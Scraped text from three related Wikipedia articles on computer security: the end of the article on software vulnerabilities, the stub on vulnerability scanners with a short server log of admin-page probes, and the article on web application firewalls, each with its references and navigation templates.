The time of disclosure of a vulnerability is defined differently in the security community and industry. It is most commonly referred to as "a kind of public disclosure of security information by a certain party". Usually, vulnerability information is discussed on a mailing list or published on a security web site and results in a security advisory afterward.
The time of disclosure is the first date a security vulnerability is described on a channel where the disclosed information on the vulnerability has to fulfill the following requirement:

The information is freely available to the public
The vulnerability information is published by a trusted and independent channel/source
The vulnerability has undergone analysis by experts such that risk rating information is included upon disclosure
Identifying and removing vulnerabilities
Many software tools exist that can aid in the discovery (and sometimes removal) of vulnerabilities in a computer system. Though these tools can provide an auditor with a good overview of possible vulnerabilities present, they can not replace human judgment. Relying solely on scanners will yield false positives and a limited-scope view of the problems present in the system.
Vulnerabilities have been found in every major operating system [36] including Windows, macOS, various forms of Unix and Linux, OpenVMS, and others. The only way to reduce the chance of a vulnerability being used against a system is through constant vigilance, including careful system maintenance (e.g. applying software patches), best practices in deployment (e.g. the use of firewalls and access controls) and auditing (both during development and throughout the deployment lifecycle).

Locations in which vulnerabilities manifest[edit]
Vulnerabilities are related to and can manifest in:

physical environment of the system
the personnel (i.e. employees, management)
administration procedures and security policy
business operation and service delivery
hardware including peripheral devices [37] [38]
software (i.e. on premises or in cloud)
connectivity (i.e. communication equipment and facilities)
It is evident that a pure technical approach cannot always protect physical assets: one should have administrative procedure to let maintenance personnel to enter the facilities and people with adequate knowledge of the procedures, motivated to follow it with proper care. However, technical protections do not necessarily stop Social engineering (security) attacks.
Examples of vulnerabilities:

an attacker finds and uses a buffer overflow weakness to install malware to then exfiltrate sensitive data;
an attacker convinces a user to open an email message with attached malware;
a flood damages one's computer systems installed at ground floor.
Software vulnerabilities[edit]
Common types of software flaws that lead to vulnerabilities include:

Memory safety violations, such as:
Buffer overflows and over-reads
Dangling pointers
Input validation errors, such as:
Code injection
Cross-site scripting in web applications
Directory traversal
E-mail injection
Format string attacks
HTTP header injection
HTTP response splitting
SQL injection
Privilege-confusion bugs, such as:
Clickjacking
Cross-site request forgery in web applications
FTP bounce attack
Privilege escalation
Race conditions, such as:
Symlink races
Time-of-check-to-time-of-use bugs
Side-channel attack
Timing attack
User interface failures, such as:
Blaming the Victim prompting a user to make a security decision without giving the user enough information to answer it[39]
Race Conditions[40][41]
Warning fatigue[42] or user conditioning.
Some set of coding guidelines have been developed and a large number of static code analyzers has been used to verify that the code follows the guidelines.

See also[edit]
Browser security
Computer emergency response team
Information security
Internet security
Mobile security
Vulnerability scanner
Coordinated vulnerability disclosure
Full disclosure
References[edit]


^ "Vulnerability Management Life Cycle | NPCR | CDC". www.cdc.gov. 2019-03-12. Retrieved 2020-07-04.

^ Ding, Aaron Yi; De Jesus, Gianluca Limon; Janssen, Marijn (2019). "Ethical hacking for boosting IoT vulnerability management: a first look into bug bounty programs and responsible disclosure". Proceedings of the Eighth International Conference on Telecommunications and Remote Sensing - ICTRS '19. Ictrs '19. Rhodes, Greece: ACM Press: 49–55. arXiv:1909.11166. doi:10.1145/3357767.3357774. ISBN 978-1-4503-7669-3. S2CID 202676146.

^ a b ISO/IEC, "Information technology -- Security techniques-Information security risk management" ISO/IEC FIDIS 27005:2008

^ British Standard Institute, Information technology -- Security techniques -- Management of the information and communications technology security -- Part 1: Concepts and models for information and communications technology security management BS ISO/IEC 13335-1-2004

^ a b Internet Engineering Task Force RFC 4949 Internet Security Glossary, Version 2

^ "CNSS Instruction No. 4009" (PDF). 26 April 2010. Archived from the original (PDF) on 2013-06-28.

^ "FISMApedia". fismapedia.org.

^ "Term:Vulnerability". fismapedia.org.

^ NIST SP 800-30 Risk Management Guide for Information Technology Systems

^ "Glossary". europa.eu.

^ Technical Standard Risk Taxonomy ISBN 1-931624-77-1 Document Number: C081 Published by The Open Group, January 2009.

^ a b "An Introduction to Factor Analysis of Information Risk (FAIR)", Risk Management Insight LLC, November 2006 Archived 2014-11-18 at the Wayback Machine;

^ Matt Bishop and Dave Bailey. A Critical Analysis of Vulnerability Taxonomies. Technical Report CSE-96-11, Department of Computer Science at the University of California at Davis, September 1996

^ Schou, Corey (1996). Handbook of INFOSEC Terms, Version 2.0. CD-ROM (Idaho State University & Information Systems Security Organization)

^ NIATEC Glossary

^ ISACA THE RISK IT FRAMEWORK (registration required) Archived July 5, 2010, at the Wayback Machine

^ a b Wright, Joe; Harmening, Jim (2009). "15".  In Vacca, John (ed.). Computer and Information Security Handbook. Morgan Kaufmann Publications. Elsevier Inc. p. 257. ISBN 978-0-12-374354-1.

^ a b c d e Kakareka, Almantas (2009). "23".  In Vacca, John (ed.). Computer and Information Security Handbook. Morgan Kaufmann Publications. Elsevier Inc. p. 393. ISBN 978-0-12-374354-1.

^ Krsul, Ivan (April 15, 1997). "Technical Report CSD-TR-97-026". The COAST Laboratory Department of Computer Sciences, Purdue University. CiteSeerX 10.1.1.26.5435. {{cite journal}}: Cite journal requires |journal= (help)

^ Pauli, Darren (16 January 2017). "Just give up: 123456 is still the world's most popular password". The Register. Retrieved 2017-01-17.

^ "The Six Dumbest Ideas in Computer Security". ranum.com.

^ "The Web Application Security Consortium / Web Application Security Statistics". webappsec.org.

^ Ross Anderson. Why Cryptosystems Fail. Technical report, University Computer Laboratory, Cam-
bridge, January 1994.

^ Neil Schlager. When Technology Fails: Significant Technological Disasters, Accidents, and Failures of
the Twentieth Century. Gale Research Inc., 1994.

^ Hacking: The Art of Exploitation Second Edition

^ 
Kiountouzis, E. A.; Kokolakis, S. A. (31 May 1996). Information systems security: facing the information society of the 21st century. London: Chapman & Hall, Ltd. ISBN 0-412-78120-4.

^ a b Rasmussen, Jeremy (February 12, 2018). "Best Practices for Cybersecurity: Stay Cyber SMART". Tech Decisions. Retrieved September 18, 2020.

^ "What is a vulnerability? - Knowledgebase - ICTEA". www.ictea.com. Retrieved 2021-04-03.

^ Bavisi, Sanjay (2009). "22".  In Vacca, John (ed.). Computer and Information Security Handbook. Morgan Kaufmann Publications. Elsevier Inc. p. 375. ISBN 978-0-12-374354-1.

^ "The new era of vulnerability disclosure - a brief chat with HD Moore". The Tech Herald. Archived from the original on 2010-08-26. Retrieved 2010-08-24.

^ Betz, Chris (11 Jan 2015). "A Call for Better Coordinated Vulnerability Disclosure - MSRC - Site Home - TechNet Blogs". blogs.technet.com. Retrieved 12 January 2015.

^ "Wiz launches open database to track cloud vulnerabilities". SearchSecurity. Retrieved 2022-07-20.

^ Barth, Bradley (2022-06-08). "Centralized database will help standardize bug disclosure for the cloud". www.scmagazine.com. Retrieved 2022-07-20.

^ Writer, Jai VijayanContributing; ReadingJune 28, Dark; 2022 (2022-06-28). "New Vulnerability Database Catalogs Cloud Security Issues". Dark Reading. Retrieved 2022-07-20.{{cite web}}:  CS1 maint: numeric names: authors list (link)

^ "Category:Vulnerability". owasp.org.

^ David Harley (10 March 2015). "Operating System Vulnerabilities, Exploits and Insecurity". Retrieved 15 January 2019.

^ Most laptops vulnerable to attack via peripheral devices. http://www.sciencedaily.com/releases/2019/02/190225192119.htm Source: University of Cambridge]

^ Exploiting Network Printers. Institute for IT-Security, Ruhr University Bochum 

^ [1] Archived October 21, 2007, at the Wayback Machine

^ "Jesse Ruderman » Race conditions in security dialogs". squarefree.com.

^ "lcamtuf's blog". lcamtuf.blogspot.com. 16 August 2010.

^ "Warning Fatigue". freedom-to-tinker.com.


External links[edit]
 Media related to Vulnerability (computing) at Wikimedia Commons
Security advisories links from the Open Directory http://dmoz-odp.org/Computers/Security/Advisories_and_Patches/




Retrieved from "https://en.wikipedia.org/w/index.php?title=Vulnerability_(computing)&oldid=1127101634"
Categories: VulnerabilityHacking (computer security)Security complianceSoftware testingHidden categories: Webarchive template wayback linksCS1 errors: missing periodicalCS1 maint: numeric names: authors listArticles with short descriptionShort description is different from WikidataCommons category link from Wikidata
 



From Wikipedia, the free encyclopedia


This article may be expanded with text translated from the corresponding article in French.  (June 2020) Click [show] for important translation instructions.
View a machine-translated version of the French article.
Machine translation, like DeepL or Google Translate, is a useful starting point for translations, but translators must revise errors as necessary and confirm that the translation is accurate, rather than simply copy-pasting machine-translated text into the English Wikipedia.
Consider adding a topic to this template: there are already 5,313 articles in the main category, and specifying|topic= will aid in categorization.
Do not translate text that appears unreliable or low-quality. If possible, verify the text with references provided in the foreign-language article.
You must provide copyright attribution in the edit summary accompanying your translation by providing an interlanguage link to the source of your translation. A model attribution edit summary is Content in this edit is translated from the existing French Wikipedia article at [[:fr:Scanner de vulnérabilité]]; see its history for attribution.
You should also add the template {{Translated|fr|Scanner de vulnérabilité}} to the talk page.
For more guidance, see Wikipedia:Translation.
Part of a series onInformation security
Related security categories
Computer security
Automotive security
Cybercrime
Cybersex trafficking
Computer fraud
Cybergeddon
Cyberterrorism
Cyberwarfare
Electronic warfare
Information warfare
Internet security
Mobile security
Network security
Copy protection
Digital rights management

Threats
Adware
Advanced persistent threat
Arbitrary code execution
Backdoors
Hardware backdoors
Code injection
Crimeware
Cross-site scripting
Cryptojacking malware
Botnets
Data breach
Drive-by download
Browser helper objects
Viruses
Data scraping
Denial of service
Eavesdropping
Email fraud
Email spoofing
Exploits
Keyloggers
Logic bombs
Time bombs
Fork bombs
Zip bombs
Fraudulent dialers
Malware
Payload
Phishing
Polymorphic engine
Privilege escalation
Ransomware
Rootkits
Bootkits
Scareware
Shellcode
Spamming
Social engineering
Screen scraping
Spyware
Software bugs
Trojan horses
Hardware Trojans
Remote access trojans
Vulnerability
Web shells
Wiper
Worms
SQL injection
Rogue security software
Zombie

Defenses
Application security
Secure coding
Secure by default
Secure by design
Misuse case
Computer access control
Authentication
Multi-factor authentication
Authorization
Computer security software
Antivirus software
Security-focused operating system
Data-centric security
Code obfuscation
Data masking
Encryption
Firewall
Intrusion detection system
Host-based intrusion detection system (HIDS)
Anomaly detection
Security information and event management (SIEM)
Mobile secure gateway
Runtime application self-protection
vte
A vulnerability scanner is a computer program designed to assess computers, networks or applications for known weaknesses.  These scanners are used to discover the weaknesses of a given system. They are utilized in the identification and detection of vulnerabilities arising from mis-configurations or flawed programming within a network-based asset such as a firewall, router, web server, application server, etc. Modern vulnerability scanners allow for both authenticated and unauthenticated scans.  Modern scanners are typically available as SaaS (Software as a Service); provided over the internet and delivered as a web application. The modern vulnerability scanner often has the ability to customize vulnerability reports as well as the installed software, open ports, certificates and other host information that can be queried as part of its workflow. 

Authenticated scans allow for the scanner to directly access network based assets using remote administrative protocols such as secure shell (SSH) or remote desktop protocol (RDP) and authenticate using provided system credentials. This allows the vulnerability scanner to access low-level data, such as specific services and configuration details of the host operating system. It's then able to provide detailed and accurate information about the operating system and installed software, including configuration issues and missing security patches.[1]
Unauthenticated scans is a method that can result in a high number of false positives and is unable to provide detailed information about the assets operating system and installed software. This method is typically used by threat actors or security analyst trying determine the security posture of externally accessible assets.[1]
The CIS Critical Security Controls for Effective Cyber Defense designates continuous vulnerability scanning as a critical control for effective cyber defense.


Part of a server log, showing attempts by a scanner to find the administration page.

220.128.235.XXX - - [26/Aug/2010:03:00:09 +0200] "GET /db/db/main.php HTTP/1.0" 404 - "-" "-"
220.128.235.XXX - - [26/Aug/2010:03:00:09 +0200] "GET /db/myadmin/main.php HTTP/1.0" 404 - "-" "-"
220.128.235.XXX - - [26/Aug/2010:03:00:10 +0200] "GET /db/webadmin/main.php HTTP/1.0" 404 - "-" "-"
220.128.235.XXX - - [26/Aug/2010:03:00:10 +0200] "GET /db/dbweb/main.php HTTP/1.0" 404 - "-" "-"
220.128.235.XXX - - [26/Aug/2010:03:00:11 +0200] "GET /db/websql/main.php HTTP/1.0" 404 - "-" "-"
220.128.235.XXX - - [26/Aug/2010:03:00:11 +0200] "GET /db/webdb/main.php HTTP/1.0" 404 - "-" "-"
220.128.235.XXX - - [26/Aug/2010:03:00:13 +0200] "GET /db/dbadmin/main.php HTTP/1.0" 404 - "-" "-"
220.128.235.XXX - - [26/Aug/2010:03:00:13 +0200] "GET /db/db-admin/main.php HTTP/1.0" 404 - "-" "-"
 (..)



See also[edit]
Browser security
Computer emergency response team
Information security
Internet security
Mobile security
Dynamic application security testing
Penetration testing
Pentesting software toolkits
◦ OpenVAS
◦ Nessus
◦ Metasploit Project
◦ Snort
References[edit]

^ a b National Institute of Standards and Technology (September 2008). "Technical Guide to Information Security Testing and Assessment" (PDF). NIST. Retrieved 2017-10-05.


External links[edit]
Web Application [need link to legit site, old site was hoax]

National Institute of Standards and Technology (NIST) Publication of their Security Content Automation Protocol (SCAP) outline.
This computer networking article is a stub. You can help Wikipedia by expanding it.vte




Retrieved from "https://en.wikipedia.org/w/index.php?title=Vulnerability_scanner&oldid=1048088500"
Categories: Computer security softwareComputer network stubsHidden categories: Articles needing translation from French WikipediaAll stub articles
 



From Wikipedia, the free encyclopedia


This article is about a sub-type of an application firewall. For the article on application firewalls, see Application firewall. For the primary topic of  firewalls, see Firewall (computing).
HTTP specific network security system
Part of a series onInformation security
Related security categories
Computer security
Automotive security
Cybercrime
Cybersex trafficking
Computer fraud
Cybergeddon
Cyberterrorism
Cyberwarfare
Electronic warfare
Information warfare
Internet security
Mobile security
Network security
Copy protection
Digital rights management

Threats
Adware
Advanced persistent threat
Arbitrary code execution
Backdoors
Hardware backdoors
Code injection
Crimeware
Cross-site scripting
Cryptojacking malware
Botnets
Data breach
Drive-by download
Browser helper objects
Viruses
Data scraping
Denial of service
Eavesdropping
Email fraud
Email spoofing
Exploits
Keyloggers
Logic bombs
Time bombs
Fork bombs
Zip bombs
Fraudulent dialers
Malware
Payload
Phishing
Polymorphic engine
Privilege escalation
Ransomware
Rootkits
Bootkits
Scareware
Shellcode
Spamming
Social engineering
Screen scraping
Spyware
Software bugs
Trojan horses
Hardware Trojans
Remote access trojans
Vulnerability
Web shells
Wiper
Worms
SQL injection
Rogue security software
Zombie

Defenses
Application security
Secure coding
Secure by default
Secure by design
Misuse case
Computer access control
Authentication
Multi-factor authentication
Authorization
Computer security software
Antivirus software
Security-focused operating system
Data-centric security
Code obfuscation
Data masking
Encryption
Firewall
Intrusion detection system
Host-based intrusion detection system (HIDS)
Anomaly detection
Security information and event management (SIEM)
Mobile secure gateway
Runtime application self-protection
vte
A web application firewall (WAF) is a specific form of application firewall that filters, monitors, and blocks HTTP traffic to and from a  web service. By inspecting HTTP traffic, it can prevent attacks exploiting a web application's known vulnerabilities, such as SQL injection, cross-site scripting (XSS), file inclusion, and improper system configuration.[1]


History[edit]
See also: Application firewall
Dedicated web application firewalls entered the market in the late 1990s during a time when web server  attacks were becoming more prevalent.
An early version of WAF was developed by Perfecto Technologies with its AppShield product,[2] which focused on the e-commerce market and protected against illegal web page character entries. Other early WAF products, from Kavado and Gilian technologies, were available in the market at the same time, trying to solve the increasing amount of attacks on web applications in the late 90s. In 2002, the open source project ModSecurity[3] was formed in order to make WAF technology more accessible. They finalized a core rule set for protecting web applications, based on OASIS Web Application Security Technical Committee’s (WAS TC) vulnerability work. In 2003, they expanded and standardized rules through the Open Web Application Security Project’s (OWASP) Top 10 List, an annual ranking for web security vulnerabilities. This list would become the industry standard for web application security compliance.[4][5]
Since then, the market has continued to grow and evolve, especially focusing on credit card fraud prevention. With the development of the Payment Card Industry Data Security Standard (PCI DSS), a standardization of control over cardholder data,  security has become more regulated in this sector. According to CISO Magazine, the WAF market was expected to grow to $5.48 billion by 2022[6].[7]

Description[edit]
A web application firewall is a special type of application firewall that applies specifically to web applications. It is deployed in front of web applications and analyzes bi-directional web-based (HTTP) traffic - detecting and blocking anything malicious. The OWASP provides a broad technical definition for a WAF as  “a security solution on the web application level which - from a technical point of view - does not depend on the application itself.”[8] According to the PCI DSS Information Supplement for requirement 6.6, a WAF is defined as “a security policy enforcement point positioned between a web application and the client endpoint. This functionality can be implemented in software or hardware, running in an appliance device, or in a typical server running a common operating system. It may be a stand-alone device or integrated into other network components.”[9] In other words, a WAF can be a virtual or physical appliance that prevents vulnerabilities in web applications from being exploited by outside threats. These vulnerabilities may be because the application itself is a legacy type or it was insufficiently coded by design. The WAF addresses these code shortcomings by special configurations of rule-sets, also known as policies.
Previously unknown vulnerabilities can be discovered through penetration testing or via a vulnerability scanner. A web application vulnerability scanner, also known as a web application security scanner, is defined in the SAMATE NIST 500-269 as “an automated program that examines web applications for potential security vulnerabilities. In addition to searching for web application-specific vulnerabilities, the tools also look for software coding errors.”[10] Resolving vulnerabilities is commonly referred to as remediation. Corrections to the code can be made in the application but typically a more prompt response is necessary. In these situations, the application of a custom policy for a unique web application vulnerability to provide a temporary but immediate fix (known as a virtual patch) may be necessary.
WAFs are not an ultimate security solution, rather they are meant to be used in conjunction with other network perimeter security solutions such as network firewalls and intrusion prevention systems to provide a holistic defense strategy.
WAFs typically follow a positive security model, a negative security, or a combination of both as mentioned by the SANS Institute.[11] WAFs use a combination of rule-based logic, parsing, and signatures to detect and prevent attacks such as cross-site scripting and SQL injection. In general, features like browser emulation, obfuscation and virtualization as well as IP obfuscation are used to attempt to bypass WAFs.[12] The OWASP produces a list of the top ten web application security flaws. All commercial WAF offerings cover these ten flaws at a minimum. There are non-commercial options as well. As mentioned earlier, the well-known open source WAF engine called ModSecurity is one of these options. A WAF engine alone is insufficient to provide adequate protection, therefore OWASP along with Trustwave's Spiderlabs help organize and maintain a Core-Rule Set via GitHub[13] to use with the ModSecurity WAF engine.[14]

Deployment options[edit]
Although the names for operating mode may differ, WAFs are basically deployed inline in three different ways. According to NSS Labs, deployment options are transparent bridge, transparent reverse proxy, and reverse proxy.[15] 'Transparent' refers to the fact that the HTTP traffic is sent straight to the web application, therefore the WAF is transparent between the client and server. This is in contrast to reverse proxy, where the WAF acts as a proxy and the client’s traffic is sent directly to the WAF. The WAF then separately sends filtered traffic to web applications. This can provide additional benefits such as IP masking but may introduce disadvantages such as performance latency.

See also[edit]
Application firewall
Payment Card Industry Data Security Standard (PCI DSS)
Web application
Software as a service (SaaS)
Computer security
Network security
Application security
Web application security
References[edit]


^ "Web Application Firewall". TechTarget. Retrieved 10 April 2018.

^ "Perfecto Technologies Delivers AppShield for E-Business - InternetNews". www.internetnews.com. 27 August 1999. Retrieved 2016-09-20.

^ "ModSecurity homepage". ModSecurity.

^ DuPaul, Neil (25 April 2012). "What is OWASP? Guide to the OWASP Application Security Top 10". Veracode. Retrieved 10 April 2018.

^ Svartman, Daniel (12 March 2018). "The OWASP Top Ten and Today's Threat Landscape". ITProPortol. Retrieved 10 April 2018.

^ Harsh (2021-12-26). "Web Application Firewall (WAF) Market CAGR of 19.2% 2021". Firewall Authority. Retrieved 2021-12-26.

^ "Web Application Firewall Market Worth $5.48 Billion by 2022". CISO Magazine. 5 October 2017. Retrieved 10 April 2018.

^ Maximillan Dermann; Mirko Dziadzka; Boris Hemkemeier; Alexander Meisel; Matthias Rohr; Thomas Schreiber (July 7, 2008). "OWASP Best Practices: Use of Web Application Firewalls ver. 1.0.5". OWASP. OWASP.

^ PCI Data Security Standards Council (October 2008). "Information Supplement: Application Reviews and Web Application Firewalls Clarified ver. 1.2" (PDF). PCI DSS. PCI DSS.

^ Paul E. Black; Elizabeth Fong; Vadim Okun; Romain Gaucher (January 2008). "NIST Special Publication 500-269 Software Assurance Tools: Web Application Security Scanner Functional Specification Version 1.0" (PDF). SAMATE NIST. SAMATE NIST.

^ Jason Pubal (March 13, 2015). "Web Application Firewalls - Enterprise Techniques" (PDF). SANS Institute. SANS Institute InfoSec Reading Room.

^ IPM (July 29, 2022). "Reverse Engineering how WAFs Like Cloudflare Identify Bots". IPM Corporation. IPM Corporation.

^ "Core-Rule Set Project Repository". GitHub. 30 September 2022.

^ "OWASP ModSecurity Core Rule Set Project". OWASP.

^ "TEST METHODOLOGY Web Application Firewall 6.2". NSS Labs. NSS Labs. Retrieved 2018-05-03.






Retrieved from "https://en.wikipedia.org/w/index.php?title=Web_application_firewall&oldid=1126418760"
Categories: Firewall softwareWeb applicationsHidden categories: Articles with short descriptionShort description matches Wikidata
 